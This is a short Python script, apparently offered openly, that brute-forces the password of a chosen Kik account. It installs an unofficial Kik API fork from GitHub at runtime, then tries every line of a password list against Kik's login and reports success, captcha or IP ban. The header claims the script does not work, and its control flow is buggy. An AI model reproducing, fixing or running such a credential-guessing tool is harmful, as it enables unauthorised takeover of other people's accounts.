'''

This script DOES NOT WORK! Refer to the README.
StethoSpasm@Gmail.com for questions.

'''

import os
import time
print("Booting up...")
time.sleep(1)
print("If a \"fatal\" error appears here, this is normal, don't worry!") #The fatal error comes from when the dependancy is already installed.
os.system('git clone -b new https://github.com/StethoSaysHello/kik-bot-api-unofficial') #This installs the stuff from stetho's fork of Tomer8007. Just has some redundant stuff quoted out.
os.system('pip3 install ./kik-bot-api-unofficial')
os.system('pip install kik_unofficial')
from kik_unofficial.client import KikClient
from kik_unofficial.callbacks import KikClientCallback
from kik_unofficial.datatypes.xmpp.errors import LoginError
from kik_unofficial.datatypes.xmpp.login import ConnectionFailedResponse

def get_username():
    username = input("\nWhat's the username you would like to brute force?: ")
    return username

username = get_username()
if len(username) == 0:
    print("Uh-oh, it looks like you didn't provide any input! Let's try that again.")
    username = get_username()
if " " in username:
    print("Uh-oh! There is a space in the username username you provided. Let's try that again.")
    username = get_username()
print("\nOkay, I will be attempting to brute force \"@" + username + "\".")

def login(username, password):

    def main():
        BruteForce()

    class BruteForce(KikClientCallback):

        def __init__(self):
            self.client = KikClient(self, username, password)

        global result
        result = None

        def on_authenticated(self):
            global result
            print("Holy shit you did it! The password is \"" + password + "\".")
            result = True

        def on_connection_failed(self, response: ConnectionFailedResponse):
            global result
            print("Kik closed the connection for @" + username + ", you are probably IP banned.")
            result = False

        def on_login_error(self, login_error: LoginError):
            global result
            if login_error.is_captcha():
                print("This account has a captcha! You cannot continue to brute force.")
                result = True
            else:
                print("Password \"" + password + "\" failed.")
                result = False

    if __name__ == '__main__':
        main()

open_passlist = open("passlist.txt", "r+")
read_passlist = open_passlist.read()
passlist = read_passlist.split("\n")
number_of_passwords = 0
for password in passlist:
    if password:
        number_of_passwords += 1
number_of_passwords = number_of_passwords - 1
while number_of_passwords > 0:
    password = passlist[number_of_passwords]
    print("Attempting to login with password \"" + password + "\"!")
    login(username, password)
    while result is None:
        pass
    if result == True:
        print("Attack complete!")
        number_of_passwords = 0
    number_of_passwords = number_of_passwords - 1
